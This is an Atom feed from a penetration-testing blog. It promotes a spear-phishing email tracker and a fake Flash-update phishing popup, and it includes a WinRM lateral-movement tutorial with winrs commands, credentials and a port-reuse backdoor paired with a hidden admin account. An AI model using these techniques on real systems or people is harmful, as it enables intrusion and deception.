<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Se7en&#39;s Blog|资深apt install专家。</title>
  
  
  <link href="https://www.se7ensec.cn/atom.xml" rel="self"/>
  
  <link href="https://www.se7ensec.cn/"/>
  <updated>2020-11-14T19:54:03.459Z</updated>
  <id>https://www.se7ensec.cn/</id>
  
  <author>
    <name>Se7en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>鱼叉攻击|Mail-Probe 邮箱探针后台管理系统</title>
    <link href="https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-09-30T04:10:24.000Z</published>
    <updated>2020-11-14T19:54:03.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。</p></blockquote><a id="more"></a><h1 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h1><p>平常去河边钓鱼，要使用浮漂才会知道这条河是否有鱼吃饵料，同理当邮件投递出去后，此探针可以判断目标是否点击了邮件，不至于那么的苦等。</p><h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz0.png"></p><h2 id="信息查看"><a href="#信息查看" class="headerlink" title="信息查看"></a>信息查看</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz1.png"></p><h2 id="链接生成"><a href="#链接生成" class="headerlink" title="链接生成"></a>链接生成</h2><p>本程序通过php中的readfile() 函数读取本地图片，如使用自定义图片请替换public目录下的info.png，这里的图片可以使用目标公司的logo。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz2.png"></p><h1 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h1><blockquote><p>基于ThinkPHP 6开发</p></blockquote><blockquote><p>运行环境要求Apache和PHP7.1+</p></blockquote><blockquote><p>数据库文件为mail.sql</p></blockquote><p>数据库及其他配置修改env文件即可，默认为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">APP_DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[APP]</span><br><span class="line">DEFAULT_TIMEZONE &#x3D; Asia&#x2F;Shanghai</span><br><span class="line"></span><br><span class="line">[DATABASE]</span><br><span class="line">TYPE &#x3D; mysql</span><br><span class="line">HOSTNAME &#x3D; 127.0.0.1</span><br><span class="line">DATABASE &#x3D; mail</span><br><span class="line">USERNAME &#x3D; root</span><br><span class="line">PASSWORD &#x3D; root</span><br><span class="line">HOSTPORT &#x3D; 3306</span><br><span class="line">CHARSET &#x3D; utf8</span><br><span class="line">DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[LANG]</span><br><span class="line">default_lang &#x3D; zh-cn</span><br></pre></td></tr></table></figure><p>后台默认账号密码（密码修改直接替换库中MD5即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|123456</span><br></pre></td></tr></table></figure><h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><a href="https://github.com/r00tSe7en/Mail-Probe">  <img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=r00tSe7en&theme=dracula&repo=Mail-Probe" /></a><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p><a href="https://github.com/c1y2m3">@c1y2m3</a> 分享的思路</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>水坑攻击|Flash钓鱼弹窗优化版</title>
    <link href="https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/"/>
    <id>https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/</id>
    <published>2020-09-14T04:10:24.000Z</published>
    <updated>2020-11-14T19:54:40.488Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是那句话：Flash永远滴神~</p></blockquote><a id="more"></a><p>一直想写个界面精致点的Flash钓鱼，奈何各种效果实现起来实在是有点麻烦，正好发现了layer这个牛逼的弹层组件，一开始直接用的图片，几行代码就搞定了，但是还是不够完美，后来发到T00ls大家集思广益，提出了一些非常好的建议，几次修改后才有了如下的最终版。</p><p>在线预览：<a href="http://flash-pop.se7ensec.cn/">http://flash-pop.se7ensec.cn/</a></p><p>有人说flash不好用了，感觉分析好对面是干啥的，做好一些自动化、定制化的工作，上线率其实还是挺高的。</p><p>项目地址：<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是那句话：Flash永远滴神~&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
    <category term="水坑攻击" scheme="https://www.se7ensec.cn/tags/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于winRM的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-08-26T14:10:24.000Z</published>
    <updated>2020-11-14T19:55:13.677Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于winRM的横向移动</p></blockquote><a id="more"></a><h2 id="winRM简介"><a href="#winRM简介" class="headerlink" title="winRM简介"></a>winRM简介</h2><p>WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。 </p><p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP端口5985进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。</p><p>WinRM本机支持NTLM和Kerberos（域）身份验证。初始身份验证后，WinRM会话将使用AES加密（<a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity?view=powershell-7">Microsoft Docs</a>）保护。</p><p>注意：必须配置并运行WinRM服务才能接受远程连接。WinRM接受连接可能还需要几个步骤。请参阅这篇 <a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/">Pentest Lab 文章</a> 以了解更多信息。</p><p><strong>※ winRM横向移动同时适用于工作组和域环境。</strong> </p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><h3 id="通信的双方都需要开启WinRM服务"><a href="#通信的双方都需要开启WinRM服务" class="headerlink" title="通信的双方都需要开启WinRM服务"></a>通信的双方都需要开启WinRM服务</h3><p>WinRS 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。</p><p>只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p><p>WinRM状态查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;                    </span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">1077</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">0</span></span><br><span class="line">StartMode : Manual</span><br><span class="line">State     : Stopped</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><p>开启可以使用下面其中一条命令即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig <span class="literal">-q</span> <span class="comment">#这条命令运行后会自动添加防火墙例外规则，放行5985端口。</span></span><br><span class="line"><span class="built_in">Enable-PSRemoting</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>再次查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">0</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">1128</span></span><br><span class="line">StartMode : Auto</span><br><span class="line">State     : Running</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><h3 id="服务端防火墙允许WinRM服务端口通信"><a href="#服务端防火墙允许WinRM服务端口通信" class="headerlink" title="服务端防火墙允许WinRM服务端口通信"></a>服务端防火墙允许WinRM服务端口通信</h3><p>默认为5985、5986；如果5985打开，但是5986关闭，标识WinRM服务配置为仅接受HTTP连接。修改默认端口可以使用如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="WinRM通信两端配置要求"><a href="#WinRM通信两端配置要求" class="headerlink" title="WinRM通信两端配置要求"></a>WinRM通信两端配置要求</h3><p>1）查看WinRM具体配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm get winrm/config</span><br></pre></td></tr></table></figure><p>2）允许所有客户端IP连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line">winrm e winrm/config/listener <span class="comment">#查看监听地址和端口</span></span><br></pre></td></tr></table></figure><h2 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h2><p>远程连接时可能会遇到以下错误</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置 TrustedHosts 的详细信息，请运行以下命令: winrm help config。</span><br><span class="line"></span><br><span class="line">Winrs error:WinRM 客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入到域中，则必须使用 HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 通过运行以下命令 可获得有关此内容的更多信息: winrm help config。</span><br></pre></td></tr></table></figure><p>在你的攻击机上执行下面这条命令，设置为信任所有主机，再去连接即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line"> Client</span><br><span class="line">    NetworkDelayms = <span class="number">5000</span></span><br><span class="line">    URLPrefix = wsman</span><br><span class="line">    AllowUnencrypted = false</span><br><span class="line">    Auth</span><br><span class="line">        Basic = true</span><br><span class="line">        Digest = true</span><br><span class="line">        Kerberos = true</span><br><span class="line">        Negotiate = true</span><br><span class="line">        Certificate = true</span><br><span class="line">        CredSSP = false</span><br><span class="line">    DefaultPorts</span><br><span class="line">        HTTP = <span class="number">5985</span></span><br><span class="line">        HTTPS = <span class="number">5986</span></span><br><span class="line">    TrustedHosts = *</span><br></pre></td></tr></table></figure><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br><span class="line">win<span class="literal">-win7</span>\administrator</span><br></pre></td></tr></table></figure><h3 id="获取交互式的shell"><a href="#获取交互式的shell" class="headerlink" title="获取交互式的shell"></a>获取交互式的shell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% cmd</span></span><br><span class="line">Microsoft Windows [版本 <span class="number">6.1</span><span class="type">.7601</span>]</span><br><span class="line">版权所有 (c) <span class="number">2009</span> Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">95</span>c8:a481:b587:<span class="number">2</span>d7c%<span class="number">11</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.114</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.1</span></span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;<span class="number">993</span>CBC2D<span class="literal">-5164</span><span class="literal">-415A</span><span class="literal">-A70E</span><span class="literal">-00FF0F6119D5</span>&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="WSMan-WinRM"><a href="#WSMan-WinRM" class="headerlink" title="WSMan-WinRM"></a>WSMan-WinRM</h4><p> 使用WSMan.Automation COM对象通过WinRM执行远程命令。 </p><p> <a href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">Winrm爆破</td><td align="left">5985/5986端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a></td></tr></tbody></table><h2 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h2><h3 id="开启远程主机3389"><a href="#开启远程主机3389" class="headerlink" title="开启远程主机3389"></a>开启远程主机3389</h3><p>如果目标开启了WinRM可以利用<a href="https://github.com/Viralmaniar/PeekABoo">PeekABoo</a>工具使目标开启3389</p><h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>将WinRM监听端口由5985改为80或者443，即使端口被web服务也不影响，并且不影响web服务。利用如下</p><p>1）配置目标WinRM服务，更改监听端口开启复用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/service <span class="selector-tag">@</span>&#123;EnableCompatibilityHttpListener=<span class="string">&quot;true&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>2）链接目标</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br></pre></td></tr></table></figure><p>该方法适用于有web服务的机器，不会开启新的端口，配合添加隐藏管理员用户，隐蔽性极高。</p><h2 id="参考引用："><a href="#参考引用：" class="headerlink" title="参考引用："></a>参考引用：</h2><p> <a href="http://t3ngyu.leanote.com/post/LM-WinRM-WinRS">http://t3ngyu.leanote.com/post/LM-WinRM-WinRS</a></p><p> <a href="https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/">https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/</a></p><p> <a href="https://xz.aliyun.com/t/6888">https://xz.aliyun.com/t/6888</a></p><p> <a href="https://www.cnblogs.com/-mo-/p/12019314.html">https://www.cnblogs.com/-mo-/p/12019314.html</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于winRM的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>在线肾透测试中心</title>
    <link href="https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/"/>
    <id>https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/</id>
    <published>2020-08-24T14:10:24.000Z</published>
    <updated>2020-11-14T19:55:25.730Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>“成就他人是一个伟大得行为，我将贯彻到底。”    ——hl0rey</p></blockquote><a id="more"></a><p>作为天天肾透，日日肾虚的我们，常常需要借助各种各样的在线网站来进行信息收集、加密解密、数据处理…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.08.24/2.jpg"></p><p>随着浏览器收藏夹分类越来越多，找到网址然后打开得操作越来越觉得麻烦，便花了一些时间来整理了下做成了一个导航页，页面内容不定期会保持更新。</p><p>也不用担心某一类型重复得网站太多，不知道用哪个好，基本上贴上去得我自己全部都使用过，备注 ”推荐“ 的就是用起来感觉不错得。</p><p>个人认为通过在线网站各种功能，完成信息收集60%的工作是完全没问题的，希望可以对看文章的你有所帮助~</p><p>在线工具 - 肾透测试中心 -  <a href="https://gitbook.se7ensec.cn/">https://gitbook.se7ensec.cn/</a> </p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;“成就他人是一个伟大得行为，我将贯彻到底。”    ——hl0rey&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|使用Lnk文件的另类钓鱼方式</title>
    <link href="https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/"/>
    <id>https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-22T07:10:24.000Z</published>
    <updated>2020-11-14T19:55:57.388Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b2380840d3793d67b6d9fc04edcfc8d634b1b333d73b8018b76fc3a2791f250b">60a13925d46354e3c1b9aa984b9eaf9066ac7a8ed9b3f8311475aa9b656c0c6cb67fd62584250b5f70e1534e6acd923ed400d8b00febcb6e2af442161de0bfabb7b7a22e8c3d9161dd7027da92ac92fe223b1deb3d800d6d4bec059945898427bf7de58ea0c39595e0ee422c22019309ca3ea54fe9fb113d930f6b0b150249fecb94cb26c74df089102e8c7a3bb8f2dab2c9b01f64c7c394f1e8e377ad2401f86cef116145507c114bb964bc800a340dac05a8b60241783abafcad6737b8f88a55fdd09f4083a05e06df1f0cf8b8c630a63bb7f75ca3df6756f81c889af656bb77856417d7eeea7d73e4fde9414b0353960e0c16fad44752fbe22830cab8aafd510c40b58c233a8ba23f59612192e9c6491721c9c62595662bfd4796dac9abebf7cb19435a7ef6b40fec6eee85c67faf8d3f271efe9a7ef0ce4ccc344a61163bdca2aaba2e895d527fa0978901170d648b1f450f50b25d603f002aeece4be97588a2932879c85e0325690e08bb63add5e1b20049493071cfe90bcf14d13f875c18fab445603380958fb2f376317ad69c6fd4cbc9d33afa7412e63946a495cdf7a417b1990d246e054d278d24c5153f51ff970731b65b4b689410f580570f9f8e3a9f73bec92c0b70bcd49f4433c1e06bd7e5e4edd0c58cf7841682a7ff5111fcbc0a56f67d879229a682b8b60f8bcec11372b169e616c482f079994f53c7b8788677fb1722aa5bb1c698250585031b0c5caa312f98fce68268e563e7de65ad9a79982a94c41fea9289c93766d44d281b428fc45ced665f4a4323d2f733c9072259f06d614074f5876bd73d0b1624420c60ef7686dc02553d1b2c5e18ace329318fceb78d3bc49cbcab3f19949a805e4640ad45f828340e02e697120ffd22c8f92701e654fd33f7a1a111947f18dc5469498fdde9302640c85d3584dbcfc505d5605b766ac57a4c3be045f7ff78194d3cfa69c3be4f48d61840c226451cf7aaa3d3ec02b11a63f8a996658968e399e0e98da2afedb7e0d98719fd4a55e415c99f14b95c172e4dd2fa6656bef00a60bba994f72b5dc5dbac6be7627a740a1f8e713adf9f7ae230fe7ef44b4c27b7ac2553847682d5f7ad5bdd913b1302fe5d15880e789624bfb096f457f01033878ff595c15eaf88c215dd0130023687ae4ae0eace0dfb0ab731a310624b1bd92953fa7f171ff0dd69b26ff31cbaddbaddd3a6f85e63d0c7480e2682da9ef12d87dfa5558358e86d542c62372bdd8b324549a7f432838112e9e1447f3226c6b40b6dd0df179bc480f9d27a95b7e38627d2746160883a4b8a04542491e52b1875a8e71de625d64ccf39cf7100950f1c71caad7a05ada2252bc0beedb270c445308395158317b5b40d71d68c9435a33b64a7b8adddb471a0db5ead48e605630f2d9e10a43b22b61e5ebba00803e8c6473f7cb920af85ffd8a0c1cb55128c2fe6b1d6d3a38eca07650cc00ceebfcd8001177d5b6385e2ffb272faea39b74045025eee12464a925e32d01a2f52cd9aba5c7e75f4b5b0df5a8e5509f2ef01aef1b4573b2526935ed1b75a0764f81bf3d5fc24732d085b93b0a4e4949ecbb86963e7a9d1fa3ba6065caa79f871fa8ce363cffbd92942cb5406fd60a5d6b27e0d5d8140fc153b0e04669ad14ebbf773ddddf23e15193d3090552c0331de91b1651c1a84d3b6c7b1be4aa4b8fe1a283550dccbbd2b8d29e19c02434a0f3fbe53754292635b4ba08f0615721f131dbbfd30850692c0d6680271a3a0e42fa21113dc21d76950b0e5d41182849449621821cd74ed34ca3889dae7ba682405f88fd5f931627e72d37a56ab7cfcdf53d4e00d5341604f1651ae147ee82be71eaa6a387a3f82920d57c1c9b2aa9cd89ab14ae23e6e7cc8bf68827ae4d1e52d51f1a610df11f39ee5a10029394163320310826b229b6f42dacbfa5c515c359681d79d3c7f060d6cfc65c3b2ffd315d9a77a200f476502b70901d88a293b0bb7d9151e8bc41d3afe32bb11865d0099cf62f6bde2faef2c566a6b944fa7bb19563237ef552bded9b25293b154d0cab21d761bd6c293718183bb4b7f73c349bb8aa1674b7ab5777ea7a7d79fab879052ecf2e481bbe2a2fade9de7acb162067538c2b843d926a78aa4c18150c8b1ebfe7d832426ad2e4ed2338c1e58a544bb3a53e4398bb2d0553e145700e2784781fbc0c527754d3ae4ea98620af6e11be7cd79af2937eb647bc2cf6870e29886772e020eb386c3d073351b503066ce0c364bed838e23f9e22ee99896c3ab9bbd7850dc4261709dbec9f6076f74b294d01e2a6b8f4e7e420d4689354459eef7fc9195b664ce687b8bcd7d106973f8e4cc3c937401dd4780a1c7592cd5da9a096eabe4fada8a61760bf7b7b7bc05f7829f07a075a092a3ddc6955ff239d45514ecbceea1d2f469f038d317b03c860225daba43f9d451db8b3920923aa4cf7cf18358dfc1a2317ef6b575234feb2984cb776e68a19b7eb14de2ca26d7ed2152fb1bd56c76825335b5f9606448c959eaf095d391598ef85768f48f475682812ec8ea9a45c64c43da2fddf0b90d2927983c